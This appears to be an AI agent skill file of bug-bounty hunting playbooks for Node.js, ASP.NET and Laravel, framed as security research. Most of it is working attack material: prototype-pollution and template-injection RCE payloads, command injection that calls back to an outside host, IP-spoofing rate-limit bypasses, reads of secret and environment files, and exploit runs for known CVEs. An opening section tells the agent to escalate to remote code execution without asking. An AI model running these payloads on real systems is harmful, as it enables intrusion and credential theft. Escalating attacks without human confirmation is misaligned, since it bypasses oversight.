---
name: platform-frameworks
description: Hunt Node.js specific vulnerabilities — Prototype Pollution → RCE chains (lodash/merge/assign), Express trust proxy misconfiguration, child_process/eval injection, template engine SSTI (EJS/Pug/Handlebars), path traversal in file servers, require() injection, environment variable exfil via /proc/self/environ. Use when target runs Node.js/Express/Fastify/NestJS/Koa.
sources: hackerone_public, snyk_research, portswigger_research
report_count: 24
---

# HUNT-NODEJS — Node.js Specific Vulnerabilities

## AUTONOMOUS OPERATION

When Node.js/Express is detected: run Phase 1 fingerprinting immediately, then proceed through all attack phases without asking.

- Fingerprint confirms Node.js → start prototype pollution testing (Phase 2) right away.
- When `__proto__` is accepted in a JSON body: escalate to RCE chain immediately — do not stop to ask.
- package.json exposed → extract dependency versions → check each against known CVEs automatically.
- Chain findings: prototype pollution primitive found → hunt for sinks (`child_process`, `vm`, template engines) without asking.

---

## Crown Jewel Targets

Prototype Pollution reaching a sink in Node.js backend = Critical RCE.

**Highest-value chains:**
- **Prototype Pollution → RCE** — `__proto__` injection via `lodash.merge` / `Object.assign` → polluted prototype reaches `child_process.exec` or `vm.runInNewContext` sink
- **Express trust proxy** — `app.set('trust proxy', true)` without validation → attacker sets `X-Forwarded-For` to bypass IP allowlists or rate limits
- **EJS/Pug SSTI** — template engine receives user input → `{{= process.mainModule.require('child_process').execSync('id') }}`
- **`child_process` injection** — user input interpolated into shell command string → OS command injection
- **`require()` path traversal** — attacker-controlled module path → load arbitrary file as JS

---

## Attack Surface Signals

```
X-Powered-By: Express           Confirms Express.js
Node.js in error messages        Runtime detected
package.json exposed             Dependency list + versions
/proc/self/environ accessible    Environment variable exfil
Error stack traces with .js paths  Node.js confirmed
__proto__ in JSON accepted        Prototype pollution candidate
```

---

## Phase 1 — Fingerprint

```bash
# Confirm Node.js/Express
curl -sI https://$TARGET/ | grep -i "x-powered-by\|nodejs\|express"

# Check for package.json / node_modules exposure
curl -s "https://$TARGET/package.json"
curl -s "https://$TARGET/package-lock.json"
curl -s "https://$TARGET/node_modules/.package-lock.json"

# Error-based version detection
curl -s "https://$TARGET/nonexistent-path-xyz" | grep -i "node\|express\|cannot GET"
```

---

## Phase 2 — Prototype Pollution Detection

```bash
# JSON body injection — test if __proto__ is accepted
curl -s -X POST https://$TARGET/api/merge \
  -H "Content-Type: application/json" \
  -d '{"__proto__": {"polluted": "yes"}}'

# Constructor prototype
curl -s -X POST https://$TARGET/api/settings \
  -H "Content-Type: application/json" \
  -d '{"constructor": {"prototype": {"isAdmin": true}}}'

# URL query param injection (qs library)
curl -s "https://$TARGET/api/search?__proto__[polluted]=yes&query=test"
curl -s "https://$TARGET/api/data?constructor[prototype][admin]=1"

# Confirm pollution: does a subsequent request reflect the polluted key?
curl -s "https://$TARGET/api/me" | grep -i "polluted\|isAdmin\|admin"
```

---

## Phase 3 — Prototype Pollution → RCE Chain

```bash
# If pollution is confirmed, attempt to reach dangerous sinks

# Sink 1: child_process via options.shell pollution
curl -s -X POST https://$TARGET/api/update \
  -H "Content-Type: application/json" \
  -d '{
    "__proto__": {
      "shell": "node",
      "NODE_OPTIONS": "--require /proc/self/fd/0",
      "env": {"NODE_OPTIONS": "--inspect=COLLAB_HOST"}
    }
  }'

# Sink 2: lodash template pollution (CVE-2021-23337)
curl -s -X POST https://$TARGET/api/render \
  -H "Content-Type: application/json" \
  -d '{"__proto__": {"sourceURL": "\nreturn process.mainModule.require(\"child_process\").execSync(\"id\").toString()//"}}'

# Sink 3: ejs template options pollution
# If EJS is used for rendering, pollute the `opts.escapeXML` or `opts.outputFunctionName`
curl -s -X POST https://$TARGET/api/template \
  -H "Content-Type: application/json" \
  -d '{"__proto__": {"outputFunctionName": "x;process.mainModule.require(\"child_process\").execSync(\"curl COLLAB_HOST/pp-rce\");x"}}'

# OOB confirmation — check Interactsh for callback
```

---

## Phase 4 — Express Trust Proxy Abuse

```bash
# If Express has trust proxy enabled, X-Forwarded-For is trusted
# Test: does spoofed IP bypass IP-based rate limiting or allowlist?

# Spoof IP to 127.0.0.1 (localhost bypass)
curl -s -X POST https://$TARGET/api/admin/action \
  -H "X-Forwarded-For: 127.0.0.1" \
  -H "Content-Type: application/json" \
  -d '{"action": "test"}'

# Spoof to internal IP range
curl -s -X POST https://$TARGET/api/internal \
  -H "X-Forwarded-For: 10.0.0.1" \
  -H "X-Real-IP: 10.0.0.1"

# Rate limit bypass via rotating fake IPs
for i in $(seq 1 50); do
  curl -s https://$TARGET/api/login \
    -H "X-Forwarded-For: 1.2.3.$i" \
    -d '{"email":"admin@test.com","password":"wrong"}' \
    -o /dev/null -w "$i: %{http_code}\n"
done
```

---

## Phase 5 — Template Engine SSTI (EJS / Pug / Handlebars)

```bash
# EJS SSTI — if user input reaches EJS template context
# Test basic: <%= 7*7 %> should return 49
curl -s -X POST https://$TARGET/api/render \
  -H "Content-Type: application/json" \
  -d '{"template": "<%= 7*7 %>"}'

# EJS RCE payload
curl -s -X POST https://$TARGET/api/render \
  -H "Content-Type: application/json" \
  -d '{"template": "<%= process.mainModule.require(\"child_process\").execSync(\"id\").toString() %>"}'

# Pug SSTI
curl -s -X POST https://$TARGET/api/render \
  -H "Content-Type: application/json" \
  -d '{"template": "- var x = root.process\n= x.mainModule.require(\"child_process\").execSync(\"id\")"}'

# Handlebars — prototype pollution via template
curl -s -X POST https://$TARGET/api/render \
  -H "Content-Type: application/json" \
  -d '{"template": "{{#with \"s\" as |string|}}{{#with \"e\"}}{{#with split as |conslist|}}{{this.pop}}{{this.push (lookup string.sub \"constructor\")}}{{this.pop}}{{#with string.split as |codelist|}}{{this.pop}}{{this.push \"return process.mainModule.require(childprocess).execSync(id)\"}}{{this.pop}}{{#each conslist}}{{#with (string.sub.apply 0 codelist)}}{{this}}{{/with}}{{/each}}{{/with}}{{/with}}{{/with}}{{/with}}"}'
```

---

## Phase 6 — child_process Command Injection

```bash
# Look for endpoints that run shell commands with user input
# Signals: /api/convert, /api/exec, /api/ping, /api/scan

# Basic injection test
curl -s "https://$TARGET/api/ping?host=127.0.0.1;id"
curl -s "https://$TARGET/api/convert?file=test.pdf;curl+COLLAB_HOST/ci"
curl -s -X POST https://$TARGET/api/exec \
  -H "Content-Type: application/json" \
  -d '{"command": "ls", "args": ["&&", "curl", "COLLAB_HOST/ci"]}'

# OOB via DNS
curl -s "https://$TARGET/api/dns?host=\$(curl+COLLAB_HOST/dns-ci).example.com"
```

---

## Phase 7 — /proc/self/environ Exfil

```bash
# If LFI exists on Node.js app, /proc/self/environ leaks env vars
curl -s "https://$TARGET/api/file?path=/proc/self/environ"
curl -s "https://$TARGET/api/read?file=../../../../proc/self/environ"

# Also check:
curl -s "https://$TARGET/api/file?path=/proc/self/cmdline"  # full command line
curl -s "https://$TARGET/api/file?path=/proc/self/cwd"       # working directory
```

---

## Chain Table

| Node.js finding | Chain to | Impact |
|----------------|----------|--------|
| Prototype pollution confirmed | Find RCE sink (child_process, eval) | Critical RCE |
| Express trust proxy | Bypass IP allowlist / rate limit | Auth bypass / DoS bypass |
| SSTI in template engine | OS command execution | Critical RCE |
| child_process injection | `id && curl COLLAB_HOST` | Critical RCE |
| /proc/self/environ via LFI | AWS_ACCESS_KEY_ID leaked | Cloud compromise |

---

## Validation

✅ Prototype pollution: key appears in subsequent API responses without being sent
✅ RCE chain: OOB callback received OR `id` output in response
✅ Trust proxy: spoofed IP accepted, bypasses rate limit or allowlist

**Severity:**
- Prototype pollution → RCE: Critical
- SSTI → RCE: Critical
- child_process injection: Critical
- Trust proxy → rate limit bypass: Medium
- /proc/self/environ exfil: High (if cloud keys present)




---

## aspnet

## Crown Jewel Targets

ASP.NET deserialization bugs pay among the highest amounts in bug bounty when they reach RCE. Even when patched, the disclosure-tier findings (signed-only ViewState, dual-parser differential, request-validator quirks) reliably pay Low-Medium.

**Highest-value targets:**

- **SharePoint farms** (any version — 2013/2016/2019/SE) — sign-only ViewState + permissive ToolPane.aspx + anonymous FormDigest creates the CVE-2025-53770 ToolShell precondition chain
- **Telerik UI for ASP.NET AJAX** — `Telerik.Web.UI.WebResource.axd` is a documented RCE sink when keys leak (CVE-2017-11317, CVE-2017-11357, CVE-2019-18935)
- **Classic ASP.NET Webforms enterprise apps** — banking portals, dealer portals, HR systems left on .NET Framework 4.x
- **WCF services** (`*.svc?WSDL`) — often forgotten admin endpoints with looser auth than the main app
- **Sitecore CMS** — ViewState + Sitecore-specific deserialization chains (CVE-2021-42237)
- **DotNetNuke (DNN)** — historic ViewState RCE chains
- **Umbraco CMS** — ViewState + custom deserialization sinks

**Asset types that pay most:** internet-reachable ASP.NET Webforms apps > WCF admin services > Telerik-integrated sites > Classic ASP.NET MVC with VSF (very rare)

---

## Attack Surface Signals

**Response headers indicating ASP.NET:**
```
X-AspNet-Version: 4.0.30319          (classic — disclosure on its own)
X-Powered-By: ASP.NET
X-AspNetMvc-Version: 5.2
Server: Microsoft-IIS/10.0
Set-Cookie: ASP.NET_SessionId=...
Set-Cookie: .ASPXAUTH=...            (Forms auth cookie)
Set-Cookie: .ASPXFORMSAUTH=...
Set-Cookie: ASP.NET_SessionId=...; SameSite=None  (suggests cross-origin embedding)
```

**Body signals (in form HTML):**
```
<input type="hidden" name="__VIEWSTATE" id="__VIEWSTATE" value="..." />
<input type="hidden" name="__VIEWSTATEGENERATOR" id="__VIEWSTATEGENERATOR" value="..." />
<input type="hidden" name="__VIEWSTATEENCRYPTED" id="__VIEWSTATEENCRYPTED" value="" />
                                        ↑ EMPTY = signed-only, not encrypted = exploitable if key leaks
<input type="hidden" name="__EVENTVALIDATION" id="__EVENTVALIDATION" value="..." />
<input type="hidden" name="__REQUESTDIGEST" id="__REQUESTDIGEST" value="0x...,...">
                                        ↑ SharePoint CSRF token; if anon-issued, see hunt-sharepoint
```

**URL patterns to probe:**
```
/trace.axd                            (per-app trace viewer; sometimes anon-accessible)
/elmah.axd                            (ELMAH error log viewer)
/elmah.axd/?id=...                    (ELMAH RCE / stack-trace leak)
/*.svc                                (WCF services)
/*.svc?wsdl                           (WCF WSDL)
/*.svc/mex                            (Metadata Exchange)
/*.asmx                               (legacy SOAP)
/*.asmx?WSDL                          (legacy SOAP description)
/*.asmx?disco                         (legacy discovery)
/Telerik.Web.UI.WebResource.axd       (Telerik AJAX components)
/ChartImg.axd                         (DataVisualization controls; historic deserialization)
/ScriptResource.axd                   (script resource handler; sometimes leaks paths)
/WebResource.axd                      (web resource handler)
/_vti_bin/*                           (SharePoint Web Service Forwarder)
/api/                                 (Web API 2.x is ASP.NET on classic framework)
/signin                               (often FedAuth / WS-Federation)
```

**Tech-stack signals:**
- `Server: Microsoft-IIS/10.0` (or `/8.5`, `/7.5`) — confirmed Windows + IIS
- `X-AspNet-Version` header — classic .NET Framework (4.x); .NET Core/5+ does NOT emit this
- Cookies with `ASP.NET_SessionId`, `.ASPXAUTH`, `FedAuth` — Forms or claims auth
- `__VIEWSTATE` in form bodies — Webforms (NOT MVC, NOT Razor Pages, NOT Blazor)
- `MicrosoftSharePointTeamServices` header (sometimes stripped by ELB but leaks in `start.aspx` body) — SharePoint

---

## Step-by-Step Hunting Methodology

1. **Fingerprint the framework version.** Trigger any 500 error (stale ViewState POST is a reliable way) and look for `Version Information: Microsoft .NET Framework Version:X.X.XXXXX; ASP.NET Version:X.X.XXXX.X` in the error body. This banner discloses both the runtime and ASP.NET-version-specific patch level. .NET 4.0.30319 + ASP.NET 4.8.x is the most common modern combination.

2. **Locate every form with `__VIEWSTATE`.** Spider the target and grep for `name="__VIEWSTATE"`. Each is a candidate sink for deserialization attacks if MAC / encryption is bypassable.

3. **Check `__VIEWSTATEENCRYPTED` value.** Empty (`value=""`) means ViewState is signed-only via `<machineKey>` but NOT encrypted. Recovery of the validation key → arbitrary deserialization. Non-empty (`value="something"`) means ViewState is BOTH signed and encrypted; both keys needed to forge.

4. **Test the ViewState parser-error differential** (the dual-parser anti-pattern). Send 7+ ViewState shapes and classify responses:
   - Trivial garbage (`AAAA`) → `"Validation of viewstate MAC failed"`
   - Real prefix from current page → `"Validation of viewstate MAC failed"`
   - Flipped-bit real ViewState → `"Validation of viewstate MAC failed"`
   - Oversize (`A * 100000`) → `"Validation of viewstate MAC failed"`
   - XML-shaped (`<xss/>`) → **"The state information is invalid for this page and might be corrupted"** ← different parser path
   - LosFormatter-style prefix (`/wEPDwUKMTcxNzgyOTQwMmRkkz9p4lzA...`) → **"The state information is invalid for this page and might be corrupted"**

   The differential proves there are **two distinct deserialization entry points**, one of which dispatches BEFORE the MAC check on some payload shapes. Historically this enables MAC-before-parse-bypass exploits.

5. **Look for load-balanced cross-node ViewState MAC failures.** If POST gets a 500 with `"Validation of viewstate MAC failed. If this application is hosted by a Web Farm or cluster, ensure that <machineKey> configuration specifies the same validationKey..."`, the farm has multiple WFEs WITHOUT machineKey sync, or without sticky-session affinity. Operationally this breaks legit users; security-wise it confirms farm topology.

6. **Probe `trace.axd` and `elmah.axd`.** If either returns 200 anonymously, it's a Critical finding (trace leaks every request + headers + form data; ELMAH leaks every server error including stack traces).

7. **Enumerate WCF services (`.svc`).** For each, fetch `?wsdl` and `?mex` (metadata exchange). MEX endpoints sometimes return full service contracts including admin operations.

8. **Test request-validator bypass.** ASP.NET's request validator blocks `<` in query strings by default. Bypass categories that may still get through:
   - HTML-entity-encoded payloads (`&lt;script&gt;` — but these don't execute)
   - Encoded inside JSON / XML POST bodies (different content-type ≠ same validator)
   - In path segments (not query) — validator scope depends on framework version
   - In Cookie / Referer headers (varies)
   - Inside `<%@ ... %>` ASP directives if reached via WebDAV PUT (rare)

9. **Check `customErrors` mode.** If 500s expose full stack traces, framework versions, file paths, internal method names → `customErrors mode="Off"` is set. Should be `RemoteOnly` for production.

10. **Look for Telerik components.** `Telerik.Web.UI.WebResource.axd?type=rau` is the historic upload-to-RCE chain (CVE-2017-11317). The `dialogParametersHolder` parameter chain (CVE-2019-18935) requires the encryption key but is otherwise RCE.

11. **SharePoint-specific deserialization paths** — see `hunt-sharepoint` skill for the ToolPane.aspx + anonymous FormDigest + unencrypted ViewState chain.

12. **SafeControl enumeration via reflection.** SharePoint's `Picker.aspx?PickerDialogType=<TypeName>` (and DNN-equivalent endpoints) accept class names and return DIFFERENT error messages for "type exists but not whitelisted" vs "type does not exist." Feed a wordlist of `Microsoft.SharePoint.*.WebControls.*` types to enumerate the SafeControl list — useful for CVE-2019-0604-family hunting.

---

## Payload & Detection Patterns

**Stack-trace fingerprint (trigger via stale ViewState POST):**
```bash
curl -sk -X POST "https://target.example/page.aspx" \
  --data "__VIEWSTATE=AAAA&__VIEWSTATEGENERATOR=AAAA"
# Inspect body for:
#  - "Validation of viewstate MAC failed" → confirms signed ViewState
#  - "The state information is invalid for this page" → confirms ALTERNATE parser path
#  - "Version Information: Microsoft .NET Framework Version:X.X.XXXXX" → exact patch level
#  - "Microsoft.SharePoint.Client.ServerStub..." → SharePoint farm
```

**ViewState parser-error differential probe (Python):**
```python
import requests, re, json
S = requests.Session(); S.verify = False
# Get fresh form
r = S.get("https://target.example/path/page.aspx")
real_vs = re.search(r'__VIEWSTATE" id="__VIEWSTATE" value="([^"]+)', r.text).group(1)
real_vsg = re.search(r'__VIEWSTATEGENERATOR" id="__VIEWSTATEGENERATOR" value="([^"]+)', r.text).group(1)

# Test 7 payload shapes
for label, vs in [
    ("trivial",      "AAAA"),
    ("real",         real_vs),
    ("flipped-bit",  real_vs[:50] + "X" + real_vs[51:]),
    ("oversize",     "A" * 100000),
    ("base64",       "VGVzdE1hcmtlcjY3OFhZWg=="),
    ("xml-shaped",   "<xss/>"),
    ("losformatter", "/wEPDwUKMTcxNzgyOTQwMmRkkz9p4lzA" + "A"*50),
]:
    r = S.post("https://target.example/path/page.aspx",
               data={"__VIEWSTATE": vs, "__VIEWSTATEGENERATOR": real_vsg})
    title = re.search(r'<title>([^<]+)</title>', r.text)
    title = title.group(1)[:100] if title else "—"
    print(f"  [{label:14s}] {r.status_code}  {title}")
```

**`trace.axd` anonymous check:**
```bash
curl -sk -o /dev/null -w "%{http_code}\n" "https://target.example/trace.axd"
# 200 = full trace dump exposed → Critical
# 403 = mod set to localhost-only → check via X-Forwarded-For: 127.0.0.1
```

**WCF service enumeration:**
```bash
# Find all .svc files
curl -sk "https://target.example/" -o body.html
grep -oE '/[a-zA-Z0-9/_-]+\.svc' body.html | sort -u
# For each found:
curl -sk "https://target.example/Service.svc?wsdl" | xmllint --format - | head -60
```

**Request-validator bypass categories:**
```
# Default: <script>alert(1)</script> in ?q= → "Potentially dangerous Request.QueryString value detected"
# Bypasses that sometimes work:
?q=%3cscript%3e            (URL-encoded — depends on validator config)
?q=<svg/onload=alert(1)>  (depends on validator version)
?q=<%00script>             (NUL-byte; older validators)
?q=javascript:alert(1)     (no < at all — passes validator)
Cookie: foo=<script>       (cookie body not validated by default)
Referer: http://x.com/<script>  (referer not validated in classic ASP.NET)
```

**Telerik exploit gate (CVE-2019-18935 — requires encryption keys):**
```bash
# Fingerprint Telerik
curl -sk "https://target.example/Telerik.Web.UI.WebResource.axd?type=rau" -X POST
# If response is RadAsyncUploadHandler-style → Telerik present; try keys
# Public exploits require leaked machineKey AND telerikEncryptionKey
```

---

## Common Root Causes

1. **`viewStateEncryption="Auto"` defaults to signed-only on pages without sensitive ViewState data.** Many SharePoint pages are configured this way. When `__VIEWSTATEENCRYPTED` is empty, ViewState is signed-only — recovery of `validationKey` alone enables forgery.

2. **`<machineKey>` AutoGenerate in a Web Farm.** Each WFE generates a different key on first boot; ViewState issued by one WFE fails MAC validation on another. Operationally produces 500s; security-wise broadcasts the topology (the error message names the cluster).

3. **`<customErrors mode="Off">` left from development.** Stack traces with full method names, file paths, version banners exposed to anonymous internet users.

4. **`trace.axd` / `elmah.axd` left enabled in production.** Often forgotten in `<system.web><trace enabled="true">` blocks.

5. **Forgotten WCF `.svc` admin endpoints.** Built for internal admin tooling, never disabled when the main app went to internet exposure.

6. **Dual-parser anti-pattern: `ObjectStateFormatter` (legacy) vs `LosFormatter` (modern) deserialize in different orders relative to MAC validation.** Some payload shapes hit the legacy parser BEFORE MAC check.

7. **Request validator only applies to URL-encoded body and querystring.** Headers, cookies, XML/JSON bodies, and multipart fields are NOT validated by default. Developers assume validator is universal; it is not.

8. **`<machineKey>` checked into source repos.** Configuration check-ins to GitHub frequently leak validation/decryption keys. Combine with `hunt-misc` source-recon for Telerik / SharePoint / DNN keys.

9. **`SafeControls` web.config entries trusted to gate deserialization.** SharePoint's `<SafeControl>` list determines which classes Picker.aspx can instantiate. Bypasses exist when the inheritance check is the only gate (CVE-2019-0604 family).

---

## Bypass Techniques

| Defense | Bypass |
|---|---|
| `__VIEWSTATEENCRYPTED` non-empty (encrypted) | Recover both decryption + validation keys from any source-code leak / config-disclosure / VS forge primitive; without keys, deserialization cannot be triggered |
| Request validator blocks `<` in querystring | Move payload to Cookie / Referer / JSON body / multipart filename — validator doesn't reach those contexts in classic ASP.NET |
| `EnableViewStateMac="true"` enforced | Recover `validationKey` from web.config disclosure or `<machineKey>` AutoGenerate fingerprinting (ysoserial.net `--minify --islegacy` mode generates ViewState that passes some MAC-validation gaps) |
| `trace.axd` localhost-only | Set `X-Forwarded-For: 127.0.0.1` if the trace mode is `localOnly` and the validation uses Request.UserHostAddress (some apps use Forwarded-For instead) |
| WCF `.svc` 401 on anonymous | Try `?wsdl` and `?mex` first; metadata is sometimes anonymously enumerable even when service ops require auth |
| Telerik upload patched | Check the Telerik version: anything pre-2017Q1 (build 2017.1.118 or earlier) is the original RAU RCE. Check 2017Q3 - 2019Q3 for CVE-2019-18935 |
| `SafeControl` whitelist enforced | Inheritance gate (`instanceof PickerDialog`) IS the gate on patched SP — bypass requires finding a SafeControl subclass with a deserialization sink; enumerate via Picker.aspx |
| `customErrors mode="On"` (no stack traces) | Force a different error path: invalid Content-Length, malformed ViewState that triggers a parser-level exception below the customErrors handler |

---

## Gate 0 Validation

Before writing the report, confirm:

1. **What can the attacker DO right now with the disclosed information?**
   - `trace.axd` 200 with full request dump → **Critical** (PII / session cookies / Authorization headers exposed)
   - `elmah.axd` 200 with error log → **High** (stack traces + internal paths + sometimes credentials)
   - `__VIEWSTATEENCRYPTED` empty + recoverable machineKey via separate finding → **Critical chain to RCE**
   - `__VIEWSTATEENCRYPTED` empty without key recovery → **Low-Medium** (primitive present, not exploitable on its own)
   - Stack traces in 500s → **Low** unless they include credentials / connection strings

2. **Have you reproduced the full chain to attacker-attainable impact, or only the primitive?**
   - Cross-reference `triage-validation` Pre-Severity Gate. "Primitive confirmed" is not Critical until the chain ends in impact.

3. **Can a triager reproduce in <10 min from your report?**
   - Each step copy-pasteable curl / Python.
   - For RCE chains: link the public exploit tool (ysoserial.net, viewgen, telerik-revda) and the specific gadget chain.

---

## Real Impact Examples

### Scenario A — Signed-only ViewState + permissive ToolPane on EoL SharePoint 2013

`https://target-portal.example/_layouts/15/ToolPane.aspx?DisplayMode=Edit` returns 200 anonymously. The form contains `__VIEWSTATE` (signed only — `__VIEWSTATEENCRYPTED=""`), and `__REQUESTDIGEST` is anonymously issued via `_api/contextinfo`. Combined with SP2013 being end-of-life (no patch will ever ship), this is the canonical CVE-2025-53770 "ToolShell" precondition chain on a permanently-unpatched code path. Reported severity: **Critical**. The dual-parser test (Section 4 of Methodology) confirmed that XML-shaped payloads reach the legacy `ObjectStateFormatter` BEFORE MAC validation — additional evidence that the chain is reachable even without full machineKey recovery (though full RCE requires both).

### Scenario B — Telerik RadAsyncUploadHandler exposed on legacy bank portal

`/Telerik.Web.UI.WebResource.axd?type=rau` returns the Telerik upload handler. Telerik version (visible in JS bundle metadata) is 2016.3.1027. CVE-2017-11317 applies — keys are baked into the public Telerik DLL of that version. Upload → write `aspx` to `/app_data/` → request → RCE. Reported severity: **Critical**.

### Scenario C — trace.axd + elmah.axd both exposed on enterprise HR portal

`trace.axd` 200 returns 50 most recent requests, including `Authorization: Bearer eyJ...` headers on API requests. `elmah.axd` 200 returns full error log with database connection-string in one of the exceptions. Reported severity: **Critical** (credentials in plaintext to anonymous internet).

---

## Related Skills & Chains

- **`hunt-rce`** — ViewState deserialization is the headline ASP.NET RCE path; signed-only ViewState + leaked machineKey = RCE every time. Chain primitive: ASP.NET ViewState dual-parser MAC-bypass anti-pattern detected (signed but not encrypted, `<%@ Page enableViewStateMac="true" viewStateEncryptionMode="Never" %>`) + machineKey recovered (from web.config disclosure, `elmah.axd`, source leak, or GitHub) → `hunt-rce` ysoserial.net `TypeConfuseDelegate` gadget → arbitrary command in `w3wp.exe` worker-process identity.
- **`hunt-sharepoint`** — SharePoint farms inherit every ASP.NET anti-pattern plus their own surface. Chain primitive: ASP.NET fingerprint reveals SharePoint (X-SharePoint headers + `/_layouts/` reachable) → pivot to `hunt-sharepoint` for SP-specific RCE paths (ToolShell, SafeControl reflection) before generic ViewState attack.
- **`hunt-ntlm-info`** — IIS sites that advertise NTLM/Negotiate anonymously leak AD topology. Chain primitive: ASP.NET app behind IIS with `WWW-Authenticate: NTLM` → `hunt-ntlm-info` Type-2 challenge capture → internal forest name → cross-reference Entra tenant via `m365-entra-attack` discovery.
- **`hunt-file-upload`** — Telerik RadAsyncUpload, Kentico, Umbraco, and DotNetNuke all have historical upload-handler RCE. Chain primitive: ASP.NET CMS fingerprinted → `hunt-file-upload` bypass matrix against the CMS upload handler → `.aspx` written into web-accessible path → request → RCE under app-pool identity.
- **`triage-validation`** — `trace.axd`/`elmah.axd` disclosure is only Critical when it actually leaks live credentials/tokens; pure stack traces are usually Low. Chain primitive: pull every reported finding through `triage-validation` 7-Question Gate before submission — distinguish "verbose error" (informational) from "live bearer token in error log" (Critical) before writing the report (`redteam-report-template`).




---

## laravel

# HUNT-LARAVEL — Laravel Specific Vulnerabilities

## Crown Jewel Targets

Laravel debug mode enabled in production = instant RCE via Ignition (CVE-2021-3129).

**Highest-value findings:**
- **Ignition RCE (CVE-2021-3129)** — `APP_DEBUG=true` + Laravel < 8.4.2 → `/_ignition/execute-solution` RCE without auth
- **Telescope dashboard** — `/telescope` exposes full request/response logs, DB queries, Redis commands, scheduled jobs, environment variables
- **Horizon dashboard** — `/horizon` exposes queue job details, failed jobs with full payloads (may contain API keys, PII)
- **Signed URL manipulation** — if `URL::signedRoute` validates wrong params → bypass signed URL → unauthorized actions
- **.env exposure** — `APP_KEY` leaked → decrypt all encrypted cookies → forge session → ATO

---

## Phase 1 — Fingerprint Laravel

```bash
# Laravel-specific indicators
curl -sI https://$TARGET/ | grep -i "laravel_session\|x-powered-by.*php"
curl -s https://$TARGET/ | grep -i "laravel\|Illuminate\|csrf-token"

# Common Laravel paths
for path in /storage /public /resources "/vendor/laravel" "/.env" "/artisan"; do
  STATUS=$(curl -s -o /dev/null -w "%{http_code}" "https://$TARGET$path")
  [ "$STATUS" != "404" ] && echo "$path: $STATUS"
done

# Check error page (trigger 404)
curl -s "https://$TARGET/definitely-does-not-exist-xyz" | grep -i "laravel\|Whoops\|Ignition\|symfony"
```

---

## Phase 2 — Debug Mode & Ignition RCE (CVE-2021-3129)

```bash
# Step 1: Check if debug mode is enabled (Whoops error page)
curl -s "https://$TARGET/nonexistent" | grep -i "Whoops\|APP_DEBUG\|Ignition"

# If Whoops/Ignition is visible → debug mode ON → test CVE-2021-3129

# Step 2: Check Ignition endpoint
curl -s "https://$TARGET/_ignition/health-check" | head -5

# Step 3: CVE-2021-3129 — Laravel < 8.4.2 RCE via log file manipulation
# (Requires debug mode + writable storage/logs)
# Tool: ambionics/laravel-ignition-rce
git clone https://github.com/ambionics/laravel-ignition-rce /tmp/laravel-rce
php /tmp/laravel-rce/exploit.php https://$TARGET "id"

# Manual test — send solution request
curl -s -X POST "https://$TARGET/_ignition/execute-solution" \
  -H "Content-Type: application/json" \
  -d '{
    "solution": "Facade\\Ignition\\Solutions\\MakeViewVariableOptionalSolution",
    "parameters": {
      "variableName": "x",
      "viewFile": "php://filter/write=convert.base64-decode/resource=../storage/logs/laravel.log"
    }
  }'
```

---

## Phase 3 — Laravel Telescope & Horizon

```bash
# Telescope — request/response logs, DB queries, jobs, cache, events
curl -s "https://$TARGET/telescope" | grep -i "telescope\|laravel"
curl -s "https://$TARGET/telescope/api/requests" | python3 -m json.tool 2>/dev/null | head -50
curl -s "https://$TARGET/telescope/api/commands" | python3 -m json.tool 2>/dev/null | head -30
curl -s "https://$TARGET/telescope/api/redis" | python3 -m json.tool 2>/dev/null | head -30
curl -s "https://$TARGET/telescope/api/environment" | python3 -m json.tool 2>/dev/null | head -50

# Horizon — queue worker dashboard
curl -s "https://$TARGET/horizon" | grep -i "horizon\|laravel"
curl -s "https://$TARGET/horizon/api/stats" | python3 -m json.tool 2>/dev/null
curl -s "https://$TARGET/horizon/api/jobs/failed" | python3 -m json.tool 2>/dev/null | head -50
# Failed job payloads often contain full request data including auth tokens

# Common paths
for path in /telescope /telescope/requests /telescope/api /horizon /horizon/api/stats; do
  STATUS=$(curl -s -o /dev/null -w "%{http_code}" "https://$TARGET$path")
  [ "$STATUS" = "200" ] && echo "[+] ACCESSIBLE: $TARGET$path"
done
```

---

## Phase 4 — .env File & APP_KEY Exposure

```bash
# Direct .env access
curl -s "https://$TARGET/.env" | grep -i "APP_KEY\|DB_PASSWORD\|SECRET\|KEY"
curl -s "https://$TARGET/.env.production"
curl -s "https://$TARGET/.env.backup"
curl -s "https://$TARGET/.env.local"

# If APP_KEY found:
APP_KEY="base64:XXXXXXX"
echo "APP_KEY=$APP_KEY"
# → Can decrypt all Laravel encrypted cookies
# → Can forge session cookies → ATO for any user

# Also check
curl -s "https://$TARGET/storage/logs/laravel.log" | tail -100 | grep -i "exception\|error\|key\|password"
```

---

## Phase 4b — Environment override via query args (CVE-2024-52301)
When `register_argc_argv=On` (php.ini), Laravel parses the query-string as CLI args, so `?--env=` overrides `APP_ENV` over HTTP -> flip the app into `local`/`testing` config (debug on, seeded creds, weaker guards).
```bash
curl -s "https://$TARGET/?--env=local"          # force debug/local config
curl -s "https://$TARGET/login?--env=testing"    # swap to testing DB/config
# Confirm: debug/Whoops page or a different env banner. Fixed 11.31.0 / 10.48.23 / 9.52.17.
```

## Phase 5 — Signed URL Manipulation

```bash
# Laravel signed URLs contain signature param: ?signature=HASH
# Find signed URL endpoints
cat recon/$TARGET/urls.txt | grep "signature="

# Test: modify a non-signature parameter — should fail validation
SIGNED_URL="https://$TARGET/unsubscribe?user=123&email=test@test.com&signature=VALID_SIG"

# Modify user ID → should fail if properly signed
curl -s "${SIGNED_URL/user=123/user=999}"

# Test signature bypass: remove signature entirely
curl -s "${SIGNED_URL/&signature=VALID_SIG/}"

# Test: does the app validate ALL parameters or just some?
curl -s "${SIGNED_URL}&extra=malicious"
```

---

## Phase 6 — Mass Assignment via Eloquent

```bash
# Laravel Eloquent ORM — if model uses $guarded=[] or $fillable=[] improperly
# Test: add extra fields to update/create requests

# Profile update
curl -s -X POST "https://$TARGET/api/profile" \
  -H "Cookie: laravel_session=SESSION" \
  -H "Content-Type: application/json" \
  -d '{"name": "Test", "email": "test@test.com", "is_admin": true, "role": "admin"}'

# Registration
curl -s -X POST "https://$TARGET/api/register" \
  -H "Content-Type: application/json" \
  -d '{"name": "Test", "email": "test@new.com", "password": "test123", "verified": true, "admin": 1}'
```

---

## Phase 7 — Laravel Cookie Deserialization

```bash
# If APP_KEY is known, forge a session cookie with malicious serialized payload
# Uses phpggc gadget chains

# Get the app key
APP_KEY=$(curl -s "https://$TARGET/.env" | grep "^APP_KEY=" | cut -d= -f2)

# Generate payload with phpggc
php phpggc Laravel/RCE5 system 'id' | base64

# Sign the cookie with the app key using laravel-cookie-forge script
# python3 laravel_cookie_forge.py --key "$APP_KEY" --payload "PHPGGC_PAYLOAD"
```

---

## Chain Table

